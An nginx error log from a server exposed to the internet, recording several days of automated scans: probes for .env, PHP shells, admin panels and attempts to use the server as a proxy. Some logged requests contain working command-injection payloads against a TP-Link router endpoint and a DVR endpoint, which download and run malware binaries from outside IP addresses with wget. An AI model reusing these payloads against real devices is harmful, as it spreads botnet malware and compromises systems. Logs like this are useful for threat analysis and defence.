2024/04/17 08:34:17 [notice] 1#1: using the "epoll" event method
2024/04/17 08:34:17 [notice] 1#1: nginx/1.22.1
2024/04/17 08:34:17 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:34:17 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:34:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:34:17 [notice] 1#1: start worker processes
2024/04/17 08:34:17 [notice] 1#1: start worker process 29
2024/04/17 08:34:17 [notice] 1#1: start worker process 30
2024/04/17 08:43:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 08:43:54 [notice] 29#29: gracefully shutting down
2024/04/17 08:43:54 [notice] 30#30: gracefully shutting down
2024/04/17 08:43:54 [notice] 29#29: exiting
2024/04/17 08:43:54 [notice] 30#30: exiting
2024/04/17 08:43:54 [notice] 29#29: exit
2024/04/17 08:43:54 [notice] 30#30: exit
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2024/04/17 08:43:54 [notice] 1#1: worker process 29 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: signal 29 (SIGIO) received
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2024/04/17 08:43:54 [notice] 1#1: worker process 30 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: exit
2024/04/17 08:45:35 [notice] 1#1: using the "epoll" event method
2024/04/17 08:45:35 [notice] 1#1: nginx/1.22.1
2024/04/17 08:45:35 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:45:35 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:45:35 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:45:35 [notice] 1#1: start worker processes
2024/04/17 08:45:35 [notice] 1#1: start worker process 22
2024/04/17 08:45:35 [notice] 1#1: start worker process 23
2024/04/17 11:23:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 11:23:53 [notice] 22#22: gracefully shutting down
2024/04/17 11:23:53 [notice] 22#22: exiting
2024/04/17 11:23:53 [notice] 22#22: exit
2024/04/17 11:23:53 [notice] 23#23: gracefully shutting down
2024/04/17 11:23:53 [notice] 23#23: exiting
2024/04/17 11:23:53 [notice] 23#23: exit
2024/04/17 11:23:53 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2024/04/17 11:23:53 [notice] 1#1: worker process 22 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: worker process 23 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: exit
2024/04/17 11:27:16 [notice] 1#1: using the "epoll" event method
2024/04/17 11:27:16 [notice] 1#1: nginx/1.22.1
2024/04/17 11:27:16 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 11:27:16 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 11:27:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 11:27:16 [notice] 1#1: start worker processes
2024/04/17 11:27:16 [notice] 1#1: start worker process 22
2024/04/17 11:27:16 [notice] 1#1: start worker process 23
2024/04/17 11:30:44 [error] 22#22: *1 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.70.149.134, server: localhost, request: "GET / HTTP/1.0"
2024/04/20 22:16:26 [error] 22#22: *394 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 22:34:55 [error] 22#22: *395 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.70.149.134, server: localhost, request: "GET / HTTP/1.0"
2024/04/20 23:34:53 [error] 22#22: *398 open() "/usr/share/nginx/html/mailman/listinfo/mailman" failed (2: No such file or directory), client: 179.43.191.18, server: localhost, request: "GET /mailman/listinfo/mailman HTTP/1.1", host: "8.148.22.188"
2024/04/20 23:55:20 [error] 22#22: *399 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 38.68.48.24, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/20 23:55:20 [error] 22#22: *400 directory index of "/usr/share/nginx/html/" is forbidden, client: 38.68.48.24, server: localhost, request: "POST / HTTP/1.1", host: "8.148.22.188"
2024/04/20 23:59:42 [error] 22#22: *402 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 23:59:45 [error] 22#22: *402 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 23:59:48 [error] 22#22: *402 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 23:59:53 [error] 23#23: *403 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.251.238.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/20 23:59:56 [error] 23#23: *403 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.251.238.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/21 00:04:03 [error] 23#23: *404 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.49, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 00:04:03 [error] 23#23: *404 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.49, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/21 00:06:38 [error] 23#23: *405 directory index of "/usr/share/nginx/html/" is forbidden, client: 162.216.149.103, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 01:28:28 [error] 23#23: *406 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.254.59.76, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 02:13:28 [error] 23#23: *408 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.242.226.99, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 02:18:40 [error] 23#23: *409 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 02:24:36 [error] 23#23: *411 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 03:15:48 [error] 23#23: *415 directory index of "/usr/share/nginx/html/" is forbidden, client: 47.236.251.7, server: localhost, request: "GET http://passport.baidu.com/ HTTP/1.1", host: "passport.baidu.com:80"
2024/04/21 03:28:23 [error] 23#23: *416 directory index of "/usr/share/nginx/html/" is forbidden, client: 205.210.31.6, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 04:32:46 [error] 22#22: *420 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.135, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 04:59:51 [error] 22#22: *421 directory index of "/usr/share/nginx/html/" is forbidden, client: 46.174.191.31, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 05:11:57 [error] 22#22: *422 open() "/usr/share/nginx/html/mailman/listinfo/mailman" failed (2: No such file or directory), client: 179.43.191.18, server: localhost, request: "GET /mailman/listinfo/mailman HTTP/1.1", host: "8.148.22.188"
2024/04/21 06:09:39 [error] 22#22: *425 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 06:13:44 [error] 22#22: *426 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.3, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 06:13:44 [error] 22#22: *427 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.3, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 06:13:44 [error] 22#22: *428 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 115.231.78.3, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 06:13:44 [error] 22#22: *429 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 115.231.78.3, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 06:23:03 [error] 22#22: *430 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 06:30:26 [error] 22#22: *431 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 06:43:00 [error] 22#22: *433 open() "/usr/share/nginx/html/cgi-bin/jumpto.php" failed (2: No such file or directory), client: 80.94.92.60, server: localhost, request: "POST /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1 HTTP/1.1", host: "8.148.22.188:80", referrer: "http://8.148.22.188:80/cgi-bin/jumpto.php?class=diagnosis&page=ping"
2024/04/21 06:52:28 [error] 22#22: *434 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.170, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 06:52:28 [error] 22#22: *434 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.170, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/21 07:27:36 [error] 23#23: *435 directory index of "/usr/share/nginx/html/" is forbidden, client: 157.245.49.126, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 07:45:23 [error] 23#23: *436 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:38 [error] 23#23: *439 directory index of "/usr/share/nginx/html/" is forbidden, client: 165.227.222.199, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:38 [error] 23#23: *440 open() "/usr/share/nginx/html/form.html" failed (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /form.html HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:39 [error] 23#23: *441 open() "/usr/share/nginx/html/upl.php" failed (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /upl.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:39 [error] 23#23: *443 "/usr/share/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /geoip/ HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:40 [error] 23#23: *444 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:40 [error] 23#23: *445 open() "/usr/share/nginx/html/1.php" failed (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /1.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:41 [error] 23#23: *446 open() "/usr/share/nginx/html/bundle.js" failed (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /bundle.js HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:41 [error] 23#23: *447 "/usr/share/nginx/html/files/index.html" is not found (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /files/ HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:42 [error] 23#23: *448 open() "/usr/share/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /systembc/password.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:42 [error] 23#23: *449 open() "/usr/share/nginx/html/password.php" failed (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /password.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:28:43 [error] 23#23: *450 open() "/usr/share/nginx/html/info.php" failed (2: No such file or directory), client: 165.227.222.199, server: localhost, request: "GET /info.php HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:35:36 [error] 22#22: *451 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 08:39:02 [error] 22#22: *452 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 08:41:31 [error] 22#22: *453 open() "/usr/share/nginx/html/actuator/health" failed (2: No such file or directory), client: 162.243.146.50, server: localhost, request: "GET /actuator/health HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:01:48 [error] 22#22: *455 directory index of "/usr/share/nginx/html/" is forbidden, client: 223.113.128.153, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:03 [error] 22#22: *464 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.91.69.110, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:04 [error] 22#22: *465 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.91.69.110, server: localhost, request: "POST / HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:06 [error] 22#22: *466 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.91.69.110, server: localhost, request: "POST / HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:07 [error] 23#23: *467 open() "/usr/share/nginx/html/WuEL" failed (2: No such file or directory), client: 185.91.69.110, server: localhost, request: "GET /WuEL HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:09 [error] 23#23: *469 open() "/usr/share/nginx/html/a" failed (2: No such file or directory), client: 185.91.69.110, server: localhost, request: "GET /a HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:11 [error] 23#23: *470 open() "/usr/share/nginx/html/download/file.ext" failed (2: No such file or directory), client: 185.91.69.110, server: localhost, request: "GET /download/file.ext HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:14 [error] 23#23: *471 open() "/usr/share/nginx/html/SiteLoader" failed (2: No such file or directory), client: 185.91.69.110, server: localhost, request: "GET /SiteLoader HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:15 [error] 23#23: *472 open() "/usr/share/nginx/html/mPlayer" failed (2: No such file or directory), client: 185.91.69.110, server: localhost, request: "GET /mPlayer HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:19:18 [error] 23#23: *473 client intended to send too large body: 10485761 bytes, client: 185.91.69.110, server: localhost, request: "POST / HTTP/1.1", host: "8.148.22.188"
2024/04/21 09:29:06 [error] 23#23: *474 directory index of "/usr/share/nginx/html/" is forbidden, client: 162.216.150.214, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 09:57:26 [error] 23#23: *475 open() "/usr/share/nginx/html/portal/redlion" failed (2: No such file or directory), client: 192.241.225.27, server: localhost, request: "GET /portal/redlion HTTP/1.1", host: "8.148.22.188"
2024/04/21 11:22:51 [error] 23#23: *479 directory index of "/usr/share/nginx/html/" is forbidden, client: 36.99.136.136, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 11:26:23 [error] 23#23: *480 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 12:01:00 [error] 23#23: *481 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 12:21:31 [error] 23#23: *482 directory index of "/usr/share/nginx/html/" is forbidden, client: 162.216.150.145, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 12:35:24 [error] 22#22: *483 directory index of "/usr/share/nginx/html/" is forbidden, client: 65.49.1.62, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 12:36:35 [error] 22#22: *484 "/usr/share/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 65.49.1.65, server: localhost, request: "GET /webui/ HTTP/1.1", host: "8.148.22.188"
2024/04/21 12:38:23 [error] 22#22: *485 "/usr/share/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 65.49.1.65, server: localhost, request: "GET /geoserver/web/ HTTP/1.1", host: "8.148.22.188"
2024/04/21 12:46:03 [error] 22#22: *486 open() "/usr/share/nginx/html/Kvsh/c.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "GET /Kvsh/c.php?server=1&type=1 HTTP/1.1", host: "unique-li.club"
2024/04/21 12:53:38 [error] 22#22: *487 directory index of "/usr/share/nginx/html/" is forbidden, client: 87.236.176.206, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 13:32:21 [error] 22#22: *488 open() "/usr/share/nginx/html/device.rsp" failed (2: No such file or directory), client: 94.156.64.82, server: localhost, request: "GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%3Bcd%20%2Fvar%2Ftmp%3Bwget%20http%3A%2F%2F198.167.198.83%2Fmpx.arm7%20%3B%20chmod%20777%20mpx.arm7%3B%20.%2Fmpx.arm7%201.arm7.daydvr%3B HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 13:58:00 [error] 22#22: *489 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 14:07:34 [error] 22#22: *490 open() "/usr/share/nginx/html/Kvsh/geti.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "GET /Kvsh/geti.php HTTP/1.1", host: "unique-li.club"
2024/04/21 14:29:45 [error] 22#22: *492 directory index of "/usr/share/nginx/html/" is forbidden, client: 162.142.125.10, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 14:29:49 [error] 22#22: *493 directory index of "/usr/share/nginx/html/" is forbidden, client: 162.142.125.10, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 14:54:37 [error] 22#22: *495 open() "/usr/share/nginx/html/ip" failed (2: No such file or directory), client: 152.42.176.18, server: localhost, request: "GET http://httpbin.org/ip HTTP/1.1", host: "httpbin.org"
2024/04/21 15:11:07 [error] 22#22: *496 directory index of "/usr/share/nginx/html/" is forbidden, client: 39.103.141.16, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 15:16:59 [error] 22#22: *497 open() "/usr/share/nginx/html/nmaplowercheck1713712615" failed (2: No such file or directory), client: 39.103.141.16, server: localhost, request: "GET /nmaplowercheck1713712615 HTTP/1.1", host: "8.148.22.188"
2024/04/21 15:16:59 [error] 22#22: *498 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 39.103.141.16, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "8.148.22.188"
2024/04/21 15:17:02 [error] 23#23: *499 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 39.103.141.16, server: localhost, request: "GET /evox/about HTTP/1.1", host: "8.148.22.188"
2024/04/21 15:17:06 [error] 23#23: *501 directory index of "/usr/share/nginx/html/" is forbidden, client: 39.103.141.16, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 15:17:11 [error] 23#23: *502 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 39.103.141.16, server: localhost, request: "POST /sdk HTTP/1.1", host: "8.148.22.188"
2024/04/21 15:17:33 [error] 23#23: *504 directory index of "/usr/share/nginx/html/" is forbidden, client: 39.103.141.16, server: localhost, request: "GET / HTTP/1.0"
2024/04/21 15:17:33 [error] 23#23: *505 directory index of "/usr/share/nginx/html/" is forbidden, client: 39.103.141.16, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 15:19:27 [error] 23#23: *506 directory index of "/usr/share/nginx/html/" is forbidden, client: 178.188.30.171, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 15:29:20 [error] 23#23: *508 directory index of "/usr/share/nginx/html/" is forbidden, client: 120.79.250.151, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 15:55:09 [error] 23#23: *509 directory index of "/usr/share/nginx/html/" is forbidden, client: 208.81.201.222, server: localhost, request: "GET http://azenv.net/ HTTP/1.1", host: "azenv.net"
2024/04/21 16:23:48 [error] 23#23: *511 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 16:38:54 [error] 23#23: *512 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 16:40:37 [error] 23#23: *513 open() "/usr/share/nginx/html/druid/index.html" failed (2: No such file or directory), client: 107.170.236.41, server: localhost, request: "GET /druid/index.html HTTP/1.1", host: "8.148.22.188"
2024/04/21 16:44:02 [error] 23#23: *514 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 16:44:02 [error] 22#22: *515 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 16:44:02 [error] 22#22: *516 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 16:51:25 [error] 22#22: *517 open() "/usr/share/nginx/html/hudson" failed (2: No such file or directory), client: 192.241.210.25, server: localhost, request: "GET /hudson HTTP/1.1", host: "8.148.22.188"
2024/04/21 17:07:06 [error] 22#22: *518 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 17:22:35 [error] 22#22: *519 directory index of "/usr/share/nginx/html/" is forbidden, client: 78.36.211.22, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 17:32:50 [error] 22#22: *521 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.145.103, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 17:32:53 [error] 22#22: *522 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.145.103, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 17:53:40 [error] 22#22: *524 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.104.156.65, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 18:44:41 [error] 22#22: *526 open() "/usr/share/nginx/html/7Oeq" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /7Oeq HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 18:44:41 [error] 22#22: *527 open() "/usr/share/nginx/html/O9il" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /O9il HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 18:44:42 [error] 22#22: *528 open() "/usr/share/nginx/html/aab8" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /aab8 HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 18:44:43 [error] 22#22: *529 open() "/usr/share/nginx/html/jquery-3.3.1.slim.min.js" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /jquery-3.3.1.slim.min.js HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 18:44:43 [error] 22#22: *530 open() "/usr/share/nginx/html/aab9" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /aab9 HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 18:44:43 [error] 23#23: *531 open() "/usr/share/nginx/html/jquery-3.3.2.slim.min.js" failed (2: No such file or directory), client: 148.153.45.234, server: localhost, request: "GET /jquery-3.3.2.slim.min.js HTTP/1.1", host: "8.148.22.188:80"
2024/04/21 18:57:00 [error] 23#23: *532 directory index of "/usr/share/nginx/html/" is forbidden, client: 5.66.17.229, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 18:57:01 [error] 23#23: *532 directory index of "/usr/share/nginx/html/" is forbidden, client: 5.66.17.229, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 19:00:09 [error] 23#23: *533 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.195, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 19:00:09 [error] 23#23: *533 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.195, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/21 19:01:18 [error] 23#23: *534 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.175, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/21 19:01:18 [error] 23#23: *534 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.175, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
